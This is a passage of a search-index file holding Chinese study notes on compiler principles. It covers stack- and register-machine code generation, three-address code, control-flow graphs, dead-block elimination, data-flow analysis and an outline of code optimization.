<p>\u8be5\u8ba1\u7b97\u673a\u7684\u6307\u4ee4\u5b9a\u4e49\u5982\u4e0b\uff08\u6765\u6e90\u4e8e JVM\uff09\uff1a</p> <pre><code>s -&gt; push NUM\n     | load x\n     | store x\n     | add\n     | sub\n     | times\n     | div\n</code></pre> <p>\u7b80\u5355\u4ecb\u7ecd\u51e0\u4e2a\u6307\u4ee4\u5177\u4f53\u7684\u5185\u5b58\u548c\u6808\u64cd\u4f5c\uff1a</p> <pre><code>// push NUM\ntop++;            // \u6808\u6307\u9488\u4e0a\u79fb\uff0c\u6ce8\u610f\u6b64\u5904\u6808\u6307\u9488\u59cb\u7ec8\u6307\u5411\u6808\u9876\u5143\u7d20\nstack[top] = NUM; // \u538b\u5165\u65b0\u7684\u6808\u5143\u7d20\n\n// load x\ntop++;\nstack[top] = x;   // \u5185\u5b58\u4e2d\u7684\u503c\u538b\u5165\u6808\u4e2d\n\n// store x\nx = stack[top];\ntop--;\n\n// add\ntemp = stack[top-1] + stack[top];  // \u6808\u9876\u7684\u524d\u4e24\u4e2a\u5143\u7d20\u76f8\u52a0\ntop -= 2;                          // \u6307\u9488\u4e0b\u79fb\npush temp;                         // \u8ba1\u7b97\u7ed3\u679c\u538b\u5165\u6808\u9876\n</code></pre> <p>\u53d8\u91cf\u7684\u5185\u5b58\u5206\u914d\u4f2a\u6307\u4ee4</p> <p>\u9ed8\u8ba4\u8be5\u6808\u8ba1\u7b97\u5668\u53ea\u5141\u8bb8\u5904\u7406\u6574\u5f62\u6570 int\uff0c\u5c06\u7ed9\u53d8\u91cf x \u5206\u914d\u5185\u5b58\u7684\u4f2a\u6307\u4ee4\u662f<code>.int x</code>\u3002\u8be5\u673a\u5668\u5728\u88c5\u8f7d\u4e00\u4e2a\u7a0b\u5e8f\u65f6\uff0c\u5c31\u4f1a\u8bfb\u53d6\u4f2a\u6307\u4ee4\uff0c\u5e76\u4e14\u7ed9\u76f8\u5173\u53d8\u91cf\u5206\u914d\u5185\u5b58\u7a7a\u95f4\u3002</p> <pre><code>int x;       .int x\nx = 10;      push 10      // \u628a10\u538b\u5165\u6808\u9876\n                     store x      // \u628a\u6808\u9876\u5143\u7d20\u8d4b\u503c\u7ed9x\n</code></pre> <p>\u9012\u5f52\u4e0b\u964d\u4ee3\u7801\u751f\u6210\u7b97\u6cd5</p> <pre><code>...\nS -&gt; id = E                    Gen_S(S)\n     | printi(E)\n     | printb(E)\nE -&gt; n                                               Gen_E(E)\n     | id\n     | true\n     | false\n     | E + E\n...\n</code></pre> <p>\u82e5\u8981\u5b8c\u6210\u4e0a\u8ff0 C--\u8bed\u8a00\u7684\u90e8\u5206\u62bd\u8c61\u8bed\u6cd5\uff0c\u9700\u8981\u5b8c\u6210\u4e24\u4e2a\u9012\u5f52\u51fd\u6570\uff0c\u4ee5<code>Gen_E</code>\u4e3a\u4f8b\uff1a</p> <pre><code>Gen_=E(E e)\n{\n  switch(e)\n    case n: emit(\"push n\"); break;\n    case id: emit(\"load id\"); break;\n      case true: emit(\"push 1\"); break;\n      case false: emit(\"push 0\"); break;\n      case e1+e2:\n                Gen_E(e1);\n                Gen_E(e2);\n                emit(\"add\");\n                break;\n    case ...: //similar\n}\n</code></pre> <p>\u5982\u6b64\uff0c\u5c31\u53ef\u4ee5\u5b8c\u6210\u6808\u5f0f\u8ba1\u7b97\u673a\u7684\u4ee3\u7801\u751f\u6210\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_46","title":"\u5bc4\u5b58\u5668\u8ba1\u7b97\u673a","text":"<p>\u5bc4\u5b58\u5668\u8ba1\u7b97\u673a\u662f\u76ee\u524d\u6700\u6d41\u884c\u7684\u673a\u5668\u4f53\u7cfb\u7ed3\u6784\u4e4b\u4e00\uff0c\u5176\u673a\u5668\u4f53\u7cfb\u7ed3\u6784\u89c4\u6574\u4e14\u6548\u7387\u5f88\u9ad8\uff0c\u57fa\u4e8e\u5bc4\u5b58\u5668\u7684\u67b6\u6784\u6709\u5982\u4e0b\u7279\u5f81\uff1a</p> <ul> <li>\u5178\u578b\u7684\u6709 16\u300132 \u6216\u66f4\u591a\u7684\u5bc4\u5b58\u5668\uff0c\u6240\u6709\u7684\u64cd\u4f5c\u90fd\u5728\u5bc4\u5b58\u5668\u4e2d\u8fdb\u884c</li> <li>\u8bbf\u95ee\u5185\u5b58\u90fd\u901a\u8fc7 load\u3001store \u8fdb\u884c\uff0c\u5185\u5b58\u4e0d\u80fd\u76f4\u63a5\u8fd0\u7b97</li> </ul> <p></p> <p>\u5bc4\u5b58\u5668\u8ba1\u7b97\u673a\u62bd\u8c61\u4f53\u7cfb\u7ed3\u6784\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <ul> <li>\u5185\u5b58 Memory\uff1a\u5b58\u653e<code>\u6ea2\u51fa</code>\u7684\u53d8\u91cf</li> <li>\u5bc4\u5b58\u5668 Reg\uff1a\u8fdb\u884c\u8fd0\u7b97\u7684\u7a7a\u95f4\uff0c\u6ce8\u610f\uff0c\u672c\u6b21\u5047\u8bbe\u5bc4\u5b58\u5668\u6570\u91cf\u65e0\u9650\uff0c\u56e0\u6b64\uff0c\u4e0d\u4f1a\u6709\u6ea2\u51fa\u7684\u53d8\u91cf\uff0c\u5185\u5b58\u6c38\u8fdc\u4e0d\u4f1a\u88ab\u4f7f\u7528\uff01</li> <li>\u6267\u884c\u5f15\u64ce ALU\uff1a\u6307\u4ee4\u7684\u6267\u884c</li> </ul> <p>\u673a\u5668\u6307\u4ee4</p> <pre><code>s -&gt; movn   n, r\n     | mov r1, r2\n     | load [x], r\n     | store r, [x]\n     | add r1, r2, r3\n     | sub r1, r2, r3\n     | times r1, r2, r3\n     | div r1, r2, r3\n</code></pre> <p>\u53d8\u91cf\u7684\u5bc4\u5b58\u5668\u5206\u914d\u4f2a\u6307\u4ee4</p> <p>\u540c\u6837\u9ed8\u8ba4\u4ec5\u5141\u8bb8\u5904\u7406\u6574\u578b\u6570 int\uff0c\u5e76\u4e14\u7ed9\u53d8\u91cf x \u5206\u914d\u5bc4\u5b58\u5668\u7684\u4f2a\u6307\u4ee4\u662f<code>.int x</code>\u3002</p> <p>\u5728\u4ee3\u7801\u751f\u6210\u7684\u9636\u6bb5\uff0c\u5047\u8bbe Reg \u673a\u5668\u4e0a\u6e38\u65e0\u9650\u591a\u4e2a\u5bc4\u5b58\u5668\uff1a</p> <ul> <li>\u56e0\u6b64\u6bcf\u4e2a\u58f0\u660e\u53d8\u91cf\u548c\u4e34\u65f6\u53d8\u91cf\u90fd\u4f1a\u5360\u7528\u4e00\u4e2a\uff08\u865a\u62df\uff09\u5bc4\u5b58\u5668</li> <li>\u628a\u865a\u62df\u5bc4\u5b58\u5668\u5206\u914d\u5230\u7269\u7406\u5bc4\u5b58\u5668\u7684\u8fc7\u7a0b\u79f0\u4e3a \u5bc4\u5b58\u5668\u5206\u914d</li> </ul> <p>\u9012\u5f52\u4e0b\u964d\u4ee3\u7801\u751f\u6210\u7b97\u6cd5</p> <p>\u540c\u6837\u4f7f\u7528\u9012\u5f52\u4e0b\u964d\u4ee3\u7801\u751f\u6210\u7b97\u6765\u6765\u5b9e\u73b0\u4ee3\u7801\u751f\u6210\u3002</p> <p>\u62bd\u8c61\u8bed\u6cd5\u540c\u4e0a\uff1a</p> <pre><code>...\nS -&gt; id = E                   void  Gen_S(S)\n     | printi(E)\n     | printb(E)\nE -&gt; n                                            R_t Gen_E(E)\n     | id\n     | true\n     | false\n     | E + E\n...\n</code></pre> <p>\u4ee5<code>Gen_E</code>\u4e3a\u4f8b\uff1a</p> <pre><code>R Gen_E(E e)\n{\n  switch(e)\n    case n: r = fresh();\n                    emit(\"movn n, r\");\n                    return r;\n    case id: r = fresh();\n                     emit(\"mov id, r\");\n                     return r;\n    case true: r = fresh();\n                         emit(\"movn 1, r\");\n    case e1+e2: r1 = Gen_E(e1);\n                            r2 = Gen_e(e2);\n                            r = fresh();\n                            emit(\"add r1, r2, r\");\n                            return r;\n    case ...: // \u7c7b\u4f3c\uff0c\u4e0d\u8d58\u8ff0\n}\n</code></pre>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_47","title":"\u4e2d\u95f4\u4ee3\u7801","text":"<p>\u5728\u4e0a\u4e00\u8282\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\uff0c\u751f\u6210\u673a\u5668\u8bed\u8a00\u7684\u8fc7\u7a0b\u79f0\u4e3a\u4ee3\u7801\u751f\u6210\uff0c\u4f46\u662f\u5728\u73b0\u4ee3\u7f16\u8bd1\u5668\u4e2d\uff0c\u4e0d\u4f1a\u76f4\u63a5\u4ece\u62bd\u8c61\u8bed\u6cd5\u6811\u751f\u6210\u673a\u5668\u4ee3\u7801\uff0c\u800c\u662f\u4f1a\u7ecf\u8fc7\u591a\u6b21\u7684<code>\u7ffb\u8bd1-\u4e2d\u95f4\u8868\u793a</code>\u7684\u8fc7\u7a0b\uff0c\u5212\u5206\u4e3a\u591a\u4e2a\u4e2d\u95f4\u8868\u793a\u7684\u8003\u8651\u5982\u4e0b\uff1a</p> <ul> <li>\u7f16\u8bd1\u5668\u5de5\u7a0b\u8003\u8651\uff1a\u9636\u6bb5\u5212\u5206\u3001\u4efb\u52a1\u5206\u89e3\u3001\u4ee3\u7801\u5de5\u7a0b\uff08\u5b9e\u73b0\u3001\u7ef4\u62a4\uff09\u3002</li> <li>\u7a0b\u5e8f\u5206\u6790\u548c\u4ee3\u7801\u4f18\u5316\u7684\u9700\u8981\uff1a\u4e8c\u8005\u90fd\u4e0e\u7a0b\u5e8f\u7684\u4e2d\u95f4\u8868\u793a\u5bc6\u5207\u76f8\u5173\uff0c\u8bb8\u591a\u4f18\u5316\u5728\u7279\u5b9a\u7684\u4e2d\u95f4\u8868\u793a\u4e0a\u624d\u53ef\u4ee5\u6216\u624d\u5bb9\u6613\u8fdb\u884c\u3002</li> </ul> <p>\u5e38\u7528\u7684\u4e2d\u95f4\u4ee3\u7801\u5982\u4e0b\uff1a</p> <ul> <li>\u6811\u548c\u6709\u5411\u65e0\u73af\u56fe\uff08DAG\uff09\uff1a\u9ad8\u5c42\u8868\u793a\uff0c\u9002\u7528\u4e8e\u7a0b\u5e8f\u6e90\u4ee3\u7801</li> <li>\u4e09\u5730\u5740\u7801\uff083-address code\uff09\uff1a\u4f4e\u5c42\u8868\u793a\uff0c\u9760\u8fd1\u76ee\u6807\u673a\u5668</li> <li>\u63a7\u5236\u6d41\u56fe\uff08CFG\uff09\uff1a\u66f4\u7cbe\u7ec6\u7684\u4e09\u5730\u5740\u7801\uff0c\u7a0b\u5e8f\u7684\u56fe\u72b6\u8868\u793a\uff0c\u9002\u5408\u505a \u7a0b\u5e8f\u5206\u6790\u3001\u7a0b\u5e8f\u4f18\u5316\u7b49</li> <li>\u9759\u6001\u5355\u8d4b\u503c\u5f62\u5f0f\uff08SSA\uff09\uff1a\u66f4\u7cbe\u7ec6\u7684\u63a7\u5236\u6d41\u56fe\uff0c\u540c\u65f6\u7f16\u7801\u63a7\u5236\u6d41\u4fe1\u606f\u548c\u6570\u636e\u6d41\u4fe1\u606f</li> <li>\u8fde\u7eed\u4f20\u9012\u98ce\u683c\uff08CPS\uff09\uff1a\u66f4\u4e00\u822c\u7684 SSA</li> </ul> <p>\u901a\u7528\u7f16\u8bd1\u5668\u8bed\u8a00\uff1aJava\u3001Python \u7b49\u8bed\u8a00\u90fd\u7f16\u8bd1\u4e3a\u540c\u4e00\u79cd\u4e2d\u95f4\u8868\u793a\u8bed\u8a00\uff0c\u8be5\u4e2d\u95f4\u8868\u793a\u8bed\u8a00\u53c8\u53ef\u4ee5\u7f16\u8bd1\u4e3a\u591a\u79cd\u76ee\u6807\u673a\u5668\u8bed\u8a00\uff0c\u5982 X86\u3001ARM\u3001Sparc \u7b49\u3002</p> <p>\u540e\u7eed\u4ecb\u7ecd\uff1a</p> <ul> <li>\u5e38\u7528\u7684\u4e2d\u95f4\u8868\u793a\uff1a\u4e09\u5730\u5740\u7801\u3001\u63a7\u5236\u6d41\u56fe\u3001\u9759\u6001\u5355\u8d4b\u503c\u5f62\u5f0f</li> <li>\u4ecb\u7ecd\u5728\u4e2d\u95f4\u8868\u793a\u4e0a\u505a\u7a0b\u5e8f\u5206\u6790\u7684\u7406\u8bba\u548c\u6280\u672f\uff1a\u63a7\u5236\u6d41\u5206\u6790\u3001\u6570\u636e\u6d41\u5206\u6790</li> </ul> <p>\u4e3a<code>\u4ee3\u7801\u4f18\u5316</code>\u6253\u4e0b\u57fa\u7840\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_48","title":"\u4e09\u5730\u5740\u7801","text":"<p>\u57fa\u672c\u601d\u60f3</p> <ul> <li>\u7ed9\u6bcf\u4e2a\u4e2d\u95f4\u53d8\u91cf\u548c\u8ba1\u7b97\u7ed3\u679c\u547d\u540d\uff0c\u6ca1\u6709\u590d\u5408\u8868\u8fbe\u5f0f</li> <li>\u53ea\u6709\u6700\u57fa\u672c\u7684\u63a7\u5236\u6d41\uff0c\u6ca1\u6709\u5faa\u73af\u7b49\u590d\u6742\u63a7\u5236\u7ed3\u6784\uff0c\u53ea\u6709 goto\uff0ccall \u7b49\u57fa\u672c\u63a7\u5236\u6d41</li> </ul> <p>\u56e0\u6b64\uff0c\u4e09\u5730\u5740\u7801\u53ef\u4ee5\u770b\u6210\u662f\u62bd\u8c61\u7684\u6307\u4ee4\u96c6\uff0c\u4e09\u5730\u5740\u7801\u6307\u4ee4\u5b9a\u4e49\u4e3a\uff1a</p> <pre><code>s -&gt; x = n                    // \u5e38\u6570\u8d4b\u503c\n     | x = y \u2295 z                // \u4e8c\u5143\u8fd0\u7b97\n     | x = \u03b8 y                                  // \u4e00\u5143\u8fd0\u7b97\n   | x = y                    // \u6570\u636e\u79fb\u52a8\n     | x[y] = z                                 // \u5185\u5b58\u5199\n     | x = y[z]                                 // \u5185\u5b58\u8bfb\n     | x = f(x1, ..., xn)               // \u51fd\u6570\u8c03\u7528\n     | Cjmp(x1, L1, L2)                 // \u6761\u4ef6\u8df3\u8f6c\n     | Jmp L                                        // \u65e0\u6761\u4ef6\u8df3\u8f6c\n     | Label L                                  // \u6807\u53f7\n     | Return X                                 // \u51fd\u6570\u8fd4\u56de\n</code></pre> <p>\u4f7f\u7528\u793a\u4f8b\uff1a</p> <pre><code>a = 3 + 4 * 5\n\n// \u5bf9\u5e94\u4e09\u5730\u5740\u7801\nx_1 = 4;\nx_2 = 5;\nx_3 = x_1 * x_2;\nx_4 = 3;\nx_5 = x_4 + x_3;\n\nif(x &lt; y)\n  z = 6;\nelse\n  z = 7;\n...\n\n// \u5bf9\u5e94\u4e09\u5730\u5740\u7801\nCjmp(x&lt;y, L_1, L_2);\nL_1:\n    z = 6;\n    jmp L_3\nL_2:\n    z = 7;\n    jmp L_3;\nL_3:\n    ...\n</code></pre> <p>\u5982\u4f55\u4f7f\u7528\u62bd\u8c61\u8bed\u6cd5\u6811\u751f\u6210\u5bf9\u5e94\u7684\u4e09\u5730\u5740\u7801\uff1f</p> <p>\u7c7b\u4f3c\u4e8e\u4e0a\u8ff0\u7684\u9012\u5f52\u4e0b\u964d\u4ee3\u7801\u751f\u6210\u7b97\u6cd5\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_49","title":"\u63a7\u5236\u6d41\u56fe\u53ca\u63a7\u5236\u6d41\u5206\u6790","text":"<p>\u4e09\u5730\u5740\u7801\u7684\u4e0d\u8db3\u4e4b\u5904\u5728\u4e8e\uff0c\u96be\u4ee5\u770b\u5230\u7a0b\u5e8f\u7684\u8df3\u8f6c\u5173\u7cfb\uff0c\u56e0\u6b64\u5f15\u5165\u63a7\u5236\u6d41\u56fe\uff0c\u80fd\u5e26\u6765\u5f88\u591a\u597d\u5904\uff1a</p> <ul> <li>\u63a7\u5236\u6d41\u5206\u6790\uff1a\u5bf9\u5f88\u591a\u7a0b\u5e8f\u5206\u6790\u6765\u8bf4\uff0c\u7a0b\u5e8f\u7684\u5185\u90e8\u7ed3\u6784\u5f88\u91cd\u8981\uff0c\u5178\u578b\u7684\u95ee\u9898\u5982\u7a0b\u5e8f\u4e2d\u662f\u5426\u5b58\u5728\u5faa\u73af\uff1f</li> <li>\u8fdb\u4e00\u6b65\u8fdb\u884c\u5176\u4ed6\u5206\u6790\uff0c\u5982\u6570\u636e\u6d41\u5206\u6790\u3002\u5178\u578b\u95ee\u9898\u5982\uff1a\u7a0b\u5e8f\u7b2c 5 \u884c\u7684\u53d8\u91cf x \u53ef\u80fd\u7684\u503c\u662f\u4ec0\u4e48\uff1f</li> </ul> <p>\u73b0\u4ee3\u7f16\u8bd1\u5668\u7684\u65e9\u671f\u9636\u6bb5\u5c31\u4f1a\u503e\u5411\u505a\u63a7\u5236\u6d41\u5206\u6790\uff0c\u65b9\u4fbf\u540e\u7eed\u9636\u6bb5\u7684\u5206\u6790\u3002</p> <p>\u57fa\u672c\u6982\u5ff5</p> <ul> <li>\u57fa\u672c\u5757\uff1a\u662f\u8bed\u53e5\u7684\u4e00\u4e2a\u5e8f\u5217\uff0c\u57fa\u672c\u5757\u4e2d\u7b2c\u4e00\u6761\u8bed\u53e5\u6267\u884c\u5230\u6700\u540e\u4e00\u6761\u8bed\u53e5\u65f6\uff0c\u4e0d\u80fd\u4ece\u4e2d\u95f4\u8fdb\u5165\u548c\u9000\u51fa\uff0c\u5373\u8df3\u8f6c\u8bed\u53e5\u53ea\u80fd\u51fa\u73b0\u5728\u57fa\u672c\u5757\u7684\u672b\u5c3e\u3002</li> <li>\u63a7\u5236\u6d41\u56fe\uff1a\u63a7\u5236\u6d41\u56fe\u662f\u4e00\u4e2a\u6709\u5411\u56fe<code>G=(V, E)</code></li> <li>\u8282\u70b9 V\uff1a\u57fa\u672c\u5757</li> <li>\u8fb9 E\uff1a\u57fa\u672c\u5757\u4e4b\u95f4\u7684\u8df3\u8f6c\u5173\u7cfb</li> </ul> <p></p> <p>\u5982\u4f55\u751f\u6210\u63a7\u5236\u6d41\u56fe\uff1f</p> <ul> <li>\u76f4\u63a5\u4ece\u62bd\u8c61\u8bed\u6cd5\u6811\u751f\u6210\uff1a\u9ad8\u5c42\u8bed\u8a00\u5177\u6709\u7279\u522b\u89c4\u6574\u7684\u63a7\u5236\u6d41\u7ed3\u6784\uff0c\u5982 Java</li> <li>\u5148\u751f\u6210\u4e09\u5730\u5740\u7801\uff0c\u7136\u540e\u7ee7\u7eed\u751f\u6210\u63a7\u5236\u6d41\u56fe\uff1a\u9ad8\u5c42\u8bed\u8a00\u5305\u542b goto \u7b49\u975e\u673a\u6784\u5316\u7684\u63a7\u5236\u6d41\u8bed\u53e5\uff0c\u5982 C\uff1b\u6b64\u5916\uff0c\u9636\u6bb5\u5212\u5206\u4e5f\u662f\u66f4\u52a0\u901a\u7528\u7684\u65b9\u5f0f\u3002</li> </ul> <p>\u63a7\u5236\u6d41\u56fe\u7684\u57fa\u672c\u64cd\u4f5c\uff1a</p> <ul> <li>\u6807\u51c6\u7684\u56fe\u8bba\u7b97\u6cd5\u90fd\u53ef\u4ee5\u7528\u5728\u63a7\u5236\u6d41\u56fe\u7684\u64cd\u4f5c\u4e0a\uff1a\u5404\u79cd\u904d\u5386\u7b97\u6cd5\u3001\u751f\u6210\u6811\u3001\u5fc5\u7ecf\u8282\u70b9\u7ed3\u6784\u7b49</li> <li>\u56fe\u8282\u70b9\u7684\u987a\u5e8f\u6709\u91cd\u8981\u7684\u5e94\u7528\uff1a\u62d3\u6251\u5e8f\u3001\u9006\u62d3\u6251\u5e8f\u3001\u8fd1\u4f3c\u62d3\u6251\u5e8f\u7b49</li> </ul> <p>\u4ee5<code>\u6b7b\u57fa\u672c\u5757\u5220\u9664</code>\u4f18\u5316\u4e3a\u4f8b\uff0c\u8bb2\u89e3\u56fe\u7b97\u6cd5\u7684\u5e94\u7528\uff1a</p> <pre><code>int f()\n{\n  int i = 3;\n  while(i&lt;10){\n    i = i+1;\n    printi(i);\n    continue;\n    printi(i); // \u8fd9\u53e5\u8bdd\u65e0\u6548\n  }\n}\n</code></pre> <p>\u5176\u5bf9\u5e94\u7684\u63a7\u5236\u6d41\u56fe\u5982\u4e0b\uff1a</p> <p></p> <p>\u5982\u56fe\u6240\u793a<code>L3</code>\u662f\u6b7b\u57fa\u672c\u5757\uff0c\u53ef\u4ee5\u5220\u9664\uff0c\u5220\u9664\u7b97\u6cd5\uff1a</p> <pre><code>// \u8f93\u5165\uff1a\u63a7\u5236\u6d41\u56feg\n// \u8f93\u51fa\uff1a\u7ecf\u8fc7\u6b7b\u57fa\u672c\u5757\u5220\u9664\u540e\u7684\u63a7\u5236\u6d41\u56fe\ndead_blocks_elim(g)\n{\n  dfs(g);\n  for(each node n in g){\n    if(!visited(n))\n      delete(n);\n  }\n}\n</code></pre>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_50","title":"\u6570\u636e\u6d41\u5206\u6790","text":"<p>\u62bd\u8c61\u8bed\u6cd5\u6811\u4e5f\u53ef\u4ee5\u88ab\u8ba4\u4e3a\u662f\u4e00\u79cd\u4e2d\u95f4\u8868\u793a\uff0c\u4ee3\u7801\u4f18\u5316\u7684\u8fc7\u7a0b\u53ef\u4ee5\u5728\u6bcf\u4e00\u79cd\u4e2d\u95f4\u8868\u793a\u4e0a\u8fdb\u884c\u3002</p> <p></p> <p>\u4f18\u5316\u7684\u4e00\u822c\u6a21\u5f0f\u5206\u4e24\u6b65\u8fdb\u884c\uff1a</p> <ul> <li> <p>\u7a0b\u5e8f\u5206\u6790\uff1a</p> </li> <li> <p>\u63a7\u5236\u6d41\u5206\u6790\u3001\u6570\u636e\u6d41\u5206\u6790\u3001\u4f9d\u8d56\u5206\u6790\u3001...</p> </li> <li>\u5206\u6790\u540e\u5f97\u5230\u5f85\u4f18\u5316\u7a0b\u5e8f\u7684<code>\u9759\u6001\u4fdd\u5b88</code>\u4fe1\u606f\uff0c\u8fd9\u662f\u5bf9\u52a8\u6001\u8fd0\u884c\u884c\u4e3a\u7684\u8fd1\u4f3c\u3002</li> </ul> <p>\u9759\u6001\u4fdd\u5b88\uff1a\u4f8b\u5982 x \u662f\u7a0b\u5e8f\u8f93\u5165\uff0c\u53ea\u6709\u8fd0\u884c\u65f6\u624d\u80fd\u77e5\u9053\u503c\uff0c\u7f16\u8bd1\u5668\u53ea\u80fd\u91c7\u7528 \u9759\u6001 \u80fd\u591f\u83b7\u53d6\u7684\u4fe1\u606f\u5bf9\u7a0b\u5e8f\u505a \u4fdd\u5b88 \u4f30\u8ba1\u3002</p> <ul> <li> <p>\u7a0b\u5e8f\u91cd\u5199</p> </li> <li> <p>\u6839\u636e\u7a0b\u5e8f\u5206\u6790\u5f97\u5230\u7684\u4fe1\u606f\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u91cd\u5199</p> </li> </ul> <p>\u4ecb\u7ecd\u4e24\u79cd\u6570\u636e\u6d41\u5206\u6790\uff1a\u5230\u8fbe\u5b9a\u4e49\u5206\u6790\u548c\u6d3b\u6027\u5206\u6790\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_51","title":"\u5230\u8fbe\u5b9a\u4e49\u5206\u6790","text":"<p>\u5b9a\u4e49\uff08def\uff09\uff1a\u5bf9\u53d8\u91cf\u7684\u8d4b\u503c</p> <p>\u4f7f\u7528\uff08use\uff09\uff1a\u5bf9\u53d8\u91cf\u503c\u7684\u8bfb\u53d6</p> <p>\u6570\u636e\u6d41\u65b9\u7a0b\u53ca\u5176\u7b97\u6cd5\u5b9e\u73b0\uff08todo\uff09</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_52","title":"\u6d3b\u6027\u5206\u6790","text":"<p>\u5728\u4ee3\u7801\u751f\u6210\u7684\u8ba8\u8bba\u4e2d\uff0c\u6211\u4eec\u5047\u8bbe\u76ee\u6807\u53ca\u5176\u6709\u65e0\u9650\u591a\u4e2a\uff08\u865a\u62df\uff09\u5bc4\u5b58\u5668\u53ef\u7528\uff0c\u7531\u6b64\u7b80\u5316\u4e86\u4ee3\u7801\u751f\u6210\u7b97\u6cd5\uff0c\u4f46\u662f\u5b9e\u9645\u7684\u7269\u7406\u673a\u5668\u53ea\u6709\u6709\u9650\u591a\u4e2a\u5bc4\u5b58\u5668\uff0c\u56e0\u6b64\u5fc5\u987b\u8981\u628a\u65e0\u9650\u591a\u4e2a\u865a\u62df\u5bc4\u5b58\u5668\u5206\u914d\u5230\u6709\u9650\u4e2a\u5bc4\u5b58\u5668\u4e2d\u3002</p> <p>\u4e3a\u4e86\u4f18\u5316\u5bc4\u5b58\u5668\u5206\u914d\u7684\u4efb\u52a1\uff0c\u9700\u8981\u5c06\u8fdb\u884c\u6d3b\u6027\u5206\u6790\u3002</p> <p>\u5e72\u6270\u56fe\u7b49\uff08todo\uff09</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_53","title":"\u4ee3\u7801\u4f18\u5316","text":"<p>\u4ee3\u7801\u4f18\u5316\u662f\u5bf9\u88ab\u4f18\u5316\u7684\u7a0b\u5e8f\u8fdb\u884c\u7684\u4e00\u79cd \u8bed\u4e49\u4fdd\u6301 \u7684 \u53d8\u6362\u3002\u53d8\u6362\u7684\u76ee\u7684\u662f\u8ba9\u7a0b\u5e8f\u6bd4\u53d8\u6362\u524d\u66f4\u5c0f\u3001\u66f4\u5feb\u3001\u66f4\u8282\u80fd\u3001Cache \u884c\u4e3a\u66f4\u597d\u7b49\u3002</p> <p>\u8bed\u4e49\u4fdd\u6301\uff1a\u7a0b\u5e8f\u7684\u53ef\u89c2\u5bdf\u884c\u4e3a\u4e0d\u80fd\u6539\u53d8\uff0c\u5982 IO\u3001file\u3001network \u7b49</p> <p>\u4e0d\u5b58\u5728<code>\u5b8c\u5168\u4f18\u5316</code>\uff0c\u8fd9\u4e5f\u620f\u79f0\u4e3a\u201d\u7f16\u8bd1\u5668\u4ece\u4e1a\u8005\u6c38\u4e0d\u5931\u4e1a\u5b9a\u5f8b\u201c\u3002</p> <p>\u4ee3\u7801\u4f18\u5316\u5341\u5206\u56f0\u96be\uff1a</p> <ul> <li>\u4e0d\u80fd\u4fdd\u8bc1\u4f18\u5316\u603b\u80fd\u4ea7\u751f\u597d\u7684\u7ed3\u679c</li> <li>\u4f18\u5316\u7684\u987a\u5e8f\u548c\u7ec4\u5408\u5f88\u5173\u952e</li> <li>\u5f88\u591a\u4f18\u5316\u95ee\u9898\u662f\u975e\u786e\u5b9a\u7684</li> <li>\u4f18\u5316\u7684\u6b63\u786e\u6027\u8bba\u8bc1\u5f88\u5fae\u5999</li> </ul> <p>\u8def\u7ebf\u56fe\uff1a</p> <ul> <li>\u524d\u7aef\u4f18\u5316</li> <li>\u5c40\u90e8\u7684\u3001\u6d41\u4e0d\u654f\u611f\u7684</li> <li>\u5e38\u91cf\u6298\u53e0\u3001\u4ee3\u6570\u4f18\u5316\u3001\u6b7b\u4ee3\u7801\u5220\u9664\u7b49</li> <li>\u4e2d\u671f\u4f18\u5316</li> <li>\u5168\u5c40\u7684\u3001\u6d41\u654f\u611f\u7684</li> <li>\u5e38\u91cf\u4f20\u64ad\u3001\u62f7\u8d1d\u4f20\u64ad\u3001\u6b7b\u4ee3\u7801\u5220\u9664\u3001\u516c\u5171\u5b57\u8868\u8fbe\u5f0f\u5220\u9664\u7b49</li> <li>\u540e\u7aef\u4f18\u5316</li> <li>\u5728\u540e\u7aef\uff08\u6c47\u7f16\u4ee3\u7801\u7ea7\uff09\u8fdb\u884c</li> <li>\u5bc4\u5b58\u5668\u5206\u914d\u3001\u6307\u4ee4\u8c03\u5ea6\u3001\u7aa5\u5b54\u4f18\u5316\u7b49</li> 